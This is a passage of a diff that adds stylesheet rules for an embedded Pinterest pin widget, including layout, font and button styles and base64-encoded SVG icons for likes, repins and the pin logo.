+  left: 10px;
+  height: 16px;
+  width: 16px;
+  background: transparent url() 0 0 no-repeat;
+  background-size: 16px 16px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_attribution .PIN_1471802412739_by { 
+  line-height: 22px;
+  max-width: 75%;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  font-size: 11px;
+  font-weight: bold;
+  color: #b9b9b9;
+  position: absolute;
+  top: 0px;
+  left: 35px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_stats { 
+  height: 24px;
+  line-height: 24px;
+  margin: 0 0 0 10px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_stats .PIN_1471802412739_repins,  .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_stats .PIN_1471802412739_likes { 
+  padding-left: 17px;
+  padding-right: 10px;
+  color: #a8a8a8;
+  font-size: 11px;
+  font-weight: bold;
+  display: inline-block;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_stats .PIN_1471802412739_repins { 
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMTRweCIgd2lkdGg9IjE0cHgiIHZpZXdCb3g9IjAgMCAxNCAxNCI+PGc+PHBhdGggZD0iTTExLjk3OSw2Ljg1OSBMMTMuOTksNS4wMTEgTDExLjI0MSw1LjAxMSBMMTAuNDg2LDAgTDkuNzM5LDUuMDExIEw3LDUuMDExIEw4Ljk4Niw2Ljg1OCBMOC45ODYsMTEuMDE3IEM4LjUwNSwxMC45ODUgOC4xNDMsMTEuMDEyIDguMTQzLDExLjIxMyBDOC4xNDMsMTEuNjg3IDguNTAzLDEyLjAwMSA4Ljk4NiwxMi4wMDEgTDExLjk4MiwxMiBDMTIuNDY1LDEyIDEyLjg4OCwxMS42ODYgMTIuODg4LDExLjIxMyBDMTIuODg4LDExLjAxMSAxMi40NjUsMTAuOTg1IDExLjk4MiwxMS4wMTcgTDExLjk3OSw2Ljg1OSBaIE00Ljk3OSw3LjE0MiBMNi45OSw4Ljk5IEw0LjI0MSw4Ljk5IEwzLjQ4NiwxNC4wMDEgTDIuNzM5LDguOTkgTDAsOC45OSBMMS45ODYsNy4xNDMgTDEuOTg2LDIuOTg0IEMxLjUwNSwzLjAxNiAxLjE0MywyLjk4OSAxLjE0MywyLjc4OCBDMS4xNDMsMi4zMTUgMS41MDMsMiAxLjk4NiwyIEw0Ljk4MiwyLjAwMSBDNS40NjUsMi4wMDEgNS44ODgsMi4zMTUgNS44ODgsMi43ODkgQzUuODg4LDIuOTkgNS40NjUsMy4wMTcgNC45ODIsMi45ODQgTDQuOTc5LDcuMTQyIFoiIGZpbGw9IiNiNWI1YjUiPjwvcGF0aD48L2c+PC9zdmc+) 0 50% no-repeat;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_stats .PIN_1471802412739_likes { 
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMTNweCIgd2lkdGg9IjE1cHgiIHZpZXdCb3g9IjAgMCAxNSAxMyI+PGc+PHBhdGggZD0iTTcuMzY5LDEyLjQzNyBMMS40NDEsNi40MSBDMC4yMTcsNS4xNjUgMCwzLjE1NiAxLjA2OCwxLjc3IEMyLjM0OCwwLjEwOCA0LjcyLDAgNi4xNDIsMS40NDYgTDcuMzY5LDIuNjk0IEw4LjUwNiwxLjUzOSBDOS43MywwLjI5MyAxMS43MDYsMC4wNzMgMTMuMDcsMS4xNTkgQzE0LjcwNSwyLjQ2MSAxNC44MTEsNC44NzIgMTMuMzg4LDYuMzE4IEw3LjM2OSwxMi40MzcgWiIgZmlsbD0iI2I1YjViNSI+PC9wYXRoPjwvZz48L3N2Zz4=) 0 51% no-repeat;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_ft { 
+  height: 50px;
+  margin-right: 10px;
+  overflow: hidden;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_ft:after { 
+  content: '-------------------------------------------------------------------------------------';
+  display: block;
+  height: 1px;
+  line-height: 1px;
+  color: #fff;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_ft .PIN_1471802412739_img { 
+  position: absolute;
+  left: 10px;
+  top: 10px;
+  height: 30px;
+  width: 30px;
+  border-radius: 30px;
+  background: transparent url() 0 0 no-repeat;
+  background-size: 30px 30px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_ft .PIN_1471802412739_pinner,  .PIN_1471802412739_embed_pin .PIN_1471802412739_ft  .PIN_1471802412739_board { 
+  position: absolute;
+  left: 50px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  width: 75%;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_ft .PIN_1471802412739_pinner { 
+  font-weight: bold;
+  top: 10px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_ft .PIN_1471802412739_board { 
+  bottom: 10px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_ja .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_repin { 
+  background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMThweCIgd2lkdGg9IjQxcHgiIHZpZXdCb3g9IjAgMCA0MSAxOCI+PGc+PHBhdGggZD0iTTE5LjgyMiw3LjE3MyBDMTkuODIyLDYuNTEgMTkuODM1LDYuMjc2IDE5Ljg4Nyw1Ljk2NCBMMTguMTQ1LDUuOTY0IEMxOC4xOTcsNi4yODkgMTguMTk3LDYuNDk3IDE4LjE5Nyw3LjE2IEwxOC4yMSwxMy4xOTIgQzE4LjIxLDEzLjk0NiAxOC4yMjMsMTQuMTY3IDE4LjI0OSwxNC4zODggQzE4LjMyNywxNS4wMjUgMTguNTIyLDE1LjQ0MSAxOC44ODYsMTUuNzE0IEMxOS4zOTMsMTYuMTA0IDIwLjI5LDE2LjI3MyAyMS45MjgsMTYuMjczIEMyMi43MjEsMTYuMjczIDI0LjM1OSwxNi4xOTUgMjUuMTI2LDE2LjExNyBDMjYuNTA0LDE1Ljk4NyAyNi41NjksMTUuOTc0IDI2Ljg0MiwxNS45NzQgTDI2Ljc2NCwxNC4yNDUgQzI2LjE5MiwxNC40MTQgMjUuOTA2LDE0LjQ3OSAyNS4yODIsMTQuNTU3IEMyNC4zMzMsMTQuNjg3IDIzLjEzNywxNC43NjUgMjIuMjY2LDE0Ljc2NSBDMjEuMDA1LDE0Ljc2NSAyMC4yNjQsMTQuNjQ4IDIwLjA0MywxNC40MjcgQzE5Ljg2MSwxNC4yNDUgMTkuODA5LDEzLjk1OSAxOS44MDksMTMuMjMxIEMxOS44MDksMTMuMTc5IDE5LjgwOSwxMy4xMDEgMTkuODIyLDEzLjAyMyBMMTkuODIyLDExLjMwNyBDMjEuOTkzLDEwLjkwNCAyNC4wMDgsMTAuMjI4IDI1LjkzMiw5LjI0IEwyNi4yNyw5LjA3MSBDMjYuMzc0LDkuMDE5IDI2LjQsOS4wMDYgMjYuNTQzLDguOTU0IEwyNS41MDMsNy40ODUgQzI0LjY1OCw4LjI3OCAyMS43ODUsOS40MzUgMTkuODIyLDkuNzk5IEwxOS44MjIsNy4xNzMgWiBNMjcuMzEsNC44NzIgQzI2LjQ5MSw0Ljg3MiAyNS44MTUsNS41NDggMjUuODE1LDYuMzY3IEMyNS44MTUsNy4xOTkgMjYuNDkxLDcuODc1IDI3LjMxLDcuODc1IEMyOC4xNDIsNy44NzUgMjguODE4LDcuMTk5IDI4LjgxOCw2LjM2NyBDMjguODE4LDUuNTQ4IDI4LjE0Miw0Ljg3MiAyNy4zMSw0Ljg3MiBMMjcuMzEsNC44NzIgWiBNMjcuMzEsNS41MjIgQzI3Ljc5MSw1LjUyMiAyOC4xNjgsNS44OTkgMjguMTY4LDYuMzY3IEMyOC4xNjgsNi44MzUgMjcuNzkxLDcuMjI1IDI3LjMxLDcuMjI1IEMyNi44NDIsNy4yMjUgMjYuNDY1LDYuODM1IDI2LjQ2NSw2LjM2NyBDMjYuNDY1LDUuODk5IDI2Ljg0Miw1LjUyMiAyNy4zMSw1LjUyMiBMMjcuMzEsNS41MjIgWiBNMzAuNTg2LDcuNjU0IEMzMS43OTUsOC4zMyAzMi44NjEsOS4xODggMzMuOTAxLDEwLjI5MyBMMzUuMDE5LDguODc2IEMzNC4wMTgsNy45MjcgMzMuMjEyLDcuMzI5IDMxLjY2NSw2LjM2NyBMMzAuNTg2LDcuNjU0IFogTTMxLjA0MSwxNi4yMzQgQzMxLjM0LDE2LjEzIDMxLjM3OSwxNi4xMTcgMzEuODk5LDE2LjAxMyBDMzMuOTE0LDE1LjU4NCAzNS41MjYsMTQuOTQ3IDM2Ljg1MiwxNC4wNjMgQzM4LjYzMywxMi44OCAzOS44NjgsMTEuMzQ2IDQwLjk3Myw4Ljk2NyBDNDAuMzEsOC40OTkgNDAuMTAyLDguMzA0IDM5LjU5NSw3LjY5MyBDMzkuMjA1LDguNzQ2IDM4Ljg0MSw5LjQ2MSAzOC4yNjksMTAuMjkzIEMzNy4yNDIsMTEuNzc1IDM2LjAzMywxMi43NzYgMzQuNDA4LDEzLjQ3OCBDMzMuMjI1LDEzLjk5OCAzMS42NzgsMTQuMzc1IDMwLjU2LDE0LjQ0IEwzMS4wNDEsMTYuMjM0IFogTTcuNDU4LDAgQzIuNSwwIDAsMy41MjIgMCw2LjQ1OSBDMCw4LjIzNyAwLjY4LDkuODE5IDIuMTM3LDEwLjQwOSBDMi4zNzYsMTAuNTA1IDIuNTksMTAuNDEyIDIuNjYsMTAuMTUgQzIuNzA4LDkuOTY5IDIuODIyLDkuNTExIDIuODczLDkuMzIgQzIuOTQzLDkuMDYxIDIuOTE2LDguOTcgMi43MjMsOC43NDQgQzIuMzAyLDguMjUzIDIuMDM0LDcuNjE3IDIuMDM0LDYuNzE2IEMyLjAzNCw0LjEwNCA0LjAwNywxLjc2NSA3LjE3MiwxLjc2NSBDOS45NzUsMS43NjUgMTEuNTE0LDMuNDYxIDExLjUxNCw1LjcyNiBDMTEuNTE0LDguNzA4IDEwLjE4MywxMS4xOCA4LjIwNiwxMS4xOCBDNy4xMTQsMTEuMTggNi4yOTcsMTAuMzI5IDYuNTU5LDkuMjMzIEM2Ljg3Miw3LjkyMiA3LjQ4LDYuNTA5IDcuNDgsNS41NjQgQzcuNDgsNC43MTcgNy4wMjIsNC4wMTEgNi4wNzIsNC4wMTEgQzQuOTU2LDQuMDExIDQuMDYsNS4xNTUgNC4wNiw2LjY4NyBDNC4wNiw3LjY2MyA0LjM5Myw4LjMyMyA0LjM5Myw4LjMyMyBDNC4zOTMsOC4zMjMgMy4yNTEsMTMuMTE3IDMuMDUxLDEzLjk1NyBDMi42NTIsMTUuNjI5IDIuOTkxLDE3LjY3OSAzLjAxOSwxNy44ODYgQzMuMDM2LDE4LjAwOSAzLjE5NSwxOC4wMzggMy4yNjcsMTcuOTQ2IEMzLjM3LDE3LjgxMiA0LjcsMTYuMTg3IDUuMTUxLDE0LjU2MiBDNS4yNzksMTQuMTAyIDUuODg1LDExLjcyIDUuODg1LDExLjcyIEM2LjI0OCwxMi40MDYgNy4zMDgsMTMuMDA5IDguNDM1LDEzLjAwOSBDMTEuNzksMTMuMDA5IDE0LjA2Niw5Ljk3OSAxNC4wNjYsNS45MjMgQzE0LjA2NiwyLjg1NyAxMS40NDQsMCA3LjQ1OCwwIFoiIGZpbGw9IiNmZmYiPjwvcGF0aD48L2c+PC9zdmc+);
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_ja .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_repin.PIN_1471802412739_save { 
+  background: #bd081c url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==) 5px 50% no-repeat;
+  background-size: 16px 16px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_medium { 
+  min-width: 237px;
+  max-width: 345px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large { 
+  min-width: 345px;
+  max-width: 600px;
+  padding: 30px 34px 10px;
+  font-size: 14px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd { 
+  border-bottom: none;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_hd { 
+  padding-top: 50px;
+  border-bottom: none;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_img,  .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_video { 
+  border-radius: 8px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_repin { 
+  top: 0px;
+  left: 0px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_source { 
+  height: 50px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_domain { 
+  line-height: 50px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_stats { 
+  position: absolute;
+  top: 0;
+  right: 0;
+  text-align: right;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_description { 
+  font-size: 16px;
+  line-height: 20px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_menu { 
+  height: inherit;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_bd .PIN_1471802412739_menu .PIN_1471802412739_dropdown { 
+  top: 50px;
+  font-size: 14px;
+  padding: 10px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_ft { 
+  height: 60px;
+  font-size: 16px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_ft .PIN_1471802412739_board,  .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_ft .PIN_1471802412739_pinner { 
+  left: 60px;
+}
+ .PIN_1471802412739_embed_pin.PIN_1471802412739_large .PIN_1471802412739_ft .PIN_1471802412739_img { 
+  height: 40px;
+  width: 40px;
+  background-size: 40px 40px;
+  border-radius: 20px;
+}
+ .PIN_1471802412739_button_follow { 
+  display: inline-block;
+  color: #363636;
+  box-sizing: border-box;
+  box-shadow: inset 0 0 1px #888;
+  border-radius: 3px;
+  font: 11px "Helvetica Neue", Helvetica, arial, sans-serif;
+  font-weight: bold;
+  cursor: pointer;
+  -webkit-font-smoothing: antialiased;
+  height: 20px;
+  line-height: 20px;
+  padding: 0 4px 0 20px;
+  background-color: #efefef;
+  position: relative;
+  white-space: nowrap;
+  vertical-align: baseline;
+}
+ .PIN_1471802412739_button_follow:hover { 
+  box-shadow: inset 0 0 1px #000;
+}
+ .PIN_1471802412739_button_follow::after { 
+  content: "";
+  position: absolute;
+  height: 14px;
+  width: 14px;
+  top: 3px;
+  left: 3px;
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==) 0 0 no-repeat;
+  background-size: 14px 14px;
+}
+ .PIN_1471802412739_button_follow.PIN_1471802412739_tall { 
+  height: 26px;
+  line-height: 26px;
+  font-size: 13px;
+  padding: 0 6px 0 25px;
+  border-radius: 3px;
+}
+ .PIN_1471802412739_button_follow.PIN_1471802412739_tall::after { 
+  height: 18px;
+  width: 18px;
+  top: 4px;
+  left: 4px;
+  background-size: 18px 18px;
+}
+ .PIN_1471802412739_button_pin { 
+  cursor: pointer;
+  display: inline-block;
+  box-sizing: border-box;
+  box-shadow: inset 0 0 1px #888;
+  border-radius: 3px;
+  height: 20px;
+  width: 40px;
+  -webkit-font-smoothing: antialiased;
+  background: #efefef url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMThweCIgd2lkdGg9IjQycHgiIHZpZXdCb3g9IjAgMCA0MiAxOCI+PGc+PHBhdGggZD0iTTE2Ljg1Myw2LjM0NSBDMTcuNjMyLDYuMzQ1IDE4LjM4LDUuNzAyIDE4LjUxLDQuOTA5IEMxOC42NjQsNC4xMzggMTguMTM1LDMuNDk0IDE3LjM1NywzLjQ5NCBDMTYuNTc4LDMuNDk0IDE1LjgzLDQuMTM4IDE1LjY5OCw0LjkwOSBDMTUuNTQ2LDUuNzAyIDE2LjA1Myw2LjM0NSAxNi44NTMsNi4zNDUgWiBNNy40NTgsMCBDMi41LDAgMCwzLjUyMiAwLDYuNDU5IEMwLDguMjM3IDAuNjgsOS44MTkgMi4xMzcsMTAuNDA5IEMyLjM3NiwxMC41MDUgMi41OSwxMC40MTIgMi42NiwxMC4xNSBDMi43MDgsOS45NjkgMi44MjIsOS41MTEgMi44NzMsOS4zMiBDMi45NDMsOS4wNjEgMi45MTYsOC45NyAyLjcyMyw4Ljc0NCBDMi4zMDIsOC4yNTMgMi4wMzQsNy42MTcgMi4wMzQsNi43MTYgQzIuMDM0LDQuMTA0IDQuMDA3LDEuNzY1IDcuMTcyLDEuNzY1IEM5Ljk3NSwxLjc2NSAxMS41MTQsMy40NjEgMTEuNTE0LDUuNzI2IEMxMS41MTQsOC43MDggMTAuMTgzLDExLjE4IDguMjA2LDExLjE4IEM3LjExNCwxMS4xOCA2LjI5NywxMC4zMjkgNi41NTksOS4yMzMgQzYuODcyLDcuOTIyIDcuNDgsNi41MDkgNy40OCw1LjU2NCBDNy40OCw0LjcxNyA3LjAyMiw0LjAxMSA2LjA3Miw0LjAxMSBDNC45NTYsNC4wMTEgNC4wNiw1LjE1NSA0LjA2LDYuNjg3IEM0LjA2LDcuNjYzIDQuMzkzLDguMzIzIDQuMzkzLDguMzIzIEM0LjM5Myw4LjMyMyAzLjI1MSwxMy4xMTcgMy4wNTEsMTMuOTU3IEMyLjY1MiwxNS42MjkgMi45OTEsMTcuNjc5IDMuMDE5LDE3Ljg4NiBDMy4wMzYsMTguMDA5IDMuMTk1LDE4LjAzOCAzLjI2NywxNy45NDYgQzMuMzcsMTcuODEyIDQuNywxNi4xODcgNS4xNTEsMTQuNTYyIEM1LjI3OSwxNC4xMDIgNS44ODUsMTEuNzIgNS44ODUsMTEuNzIgQzYuMjQ4LDEyLjQwNiA3LjMwOCwxMy4wMDkgOC40MzUsMTMuMDA5IEMxMS43OSwxMy4wMDkgMTQuMDY2LDkuOTc5IDE0LjA2Niw1LjkyMyBDMTQuMDY2LDIuODU3IDExLjQ0NCwwIDcuNDU4LDAgWiBNMjYuODk2LDE0LjE4OSBDMjYuMzQ4LDE0LjE4OSAyNi4xMTcsMTMuOTE1IDI2LjExNywxMy4zMjggQzI2LjExNywxMi40MDQgMjcuMDM1LDEwLjA5MSAyNy4wMzUsOS4wNDEgQzI3LjAzNSw3LjYzOCAyNi4yNzYsNi44MjYgMjQuNzIsNi44MjYgQzIzLjczOSw2LjgyNiAyMi43MjIsNy40NTMgMjIuMjkxLDguMDAzIEMyMi4yOTEsOC4wMDMgMjIuNDIyLDcuNTUzIDIyLjQ2Nyw3LjM4IEMyMi41MTUsNy4xOTYgMjIuNDE1LDYuODg0IDIyLjE3Myw2Ljg4NCBMMjAuNjUxLDYuODg0IEMyMC4zMjgsNi44ODQgMjAuMjM4LDcuMDU1IDIwLjE5MSw3LjI0NCBDMjAuMTcyLDcuMzIgMTkuNjI0LDkuNTg0IDE5LjA5OCwxMS42MzIgQzE4LjczOCwxMy4wMzQgMTcuODYzLDE0LjIwNSAxNi45MjgsMTQuMjA1IEMxNi40NDcsMTQuMjA1IDE2LjIzMywxMy45MDYgMTYuMjMzLDEzLjM5OSBDMTYuMjMzLDEyLjk1OSAxNi41MTksMTEuODc3IDE2Ljg2LDEwLjUzNCBDMTcuMjc2LDguODk4IDE3LjY0Miw3LjU1MSAxNy42ODEsNy4zOTQgQzE3LjczMiw3LjE5MiAxNy42NDIsNy4wMTcgMTcuMzc5LDcuMDE3IEwxNS44NDksNy4wMTcgQzE1LjU3Miw3LjAxNyAxNS40NzMsNy4xNjEgMTUuNDE0LDcuMzYxIEMxNS40MTQsNy4zNjEgMTQuOTgzLDguOTc3IDE0LjUyNywxMC43NzUgQzE0LjE5NiwxMi4wNzkgMTMuODMsMTMuNDA5IDEzLjgzLDE0LjAzNCBDMTMuODMsMTUuMTQ4IDE0LjMzNiwxNS45NDQgMTUuNzI0LDE1Ljk0NCBDMTYuNzk2LDE1Ljk0NCAxNy42NDQsMTUuNDUgMTguMjkyLDE0Ljc2NCBDMTguMTk3LDE1LjEzNSAxOC4xMzYsMTUuNDE0IDE4LjEzLDE1LjQzOSBDMTguMDc0LDE1LjY1IDE4LjE0MiwxNS44MzggMTguMzk0LDE1LjgzOCBMMTkuOTYxLDE1LjgzOCBDMjAuMjMzLDE1LjgzOCAyMC4zMzcsMTUuNzMgMjAuMzk0LDE1LjQ5NCBDMjAuNDQ5LDE1LjI2OSAyMS42MTksMTAuNjY3IDIxLjYxOSwxMC42NjcgQzIxLjkyOCw5LjQ0MyAyMi42OTIsOC42MzIgMjMuNzY4LDguNjMyIEMyNC4yNzksOC42MzIgMjQuNzIsOC45NjcgMjQuNjY5LDkuNjE4IEMyNC42MTIsMTAuMzMzIDIzLjc0MSwxMi45MDMgMjMuNzQxLDE0LjAzMSBDMjMuNzQxLDE0Ljg4NCAyNC4wNiwxNS45NDUgMjUuNjgzLDE1Ljk0NSBDMjYuNzg5LDE1Ljk0NSAyNy42MDMsMTUuNDY0IDI4LjE5NSwxNC43ODYgTDI3LjQ4OSwxMy45NDEgQzI3LjMxMSwxNC4wOTQgMjcuMTE0LDE0LjE4OSAyNi44OTYsMTQuMTg5IFogTTQxLjcwMSw2Ljg3MyBMNDAuMTM0L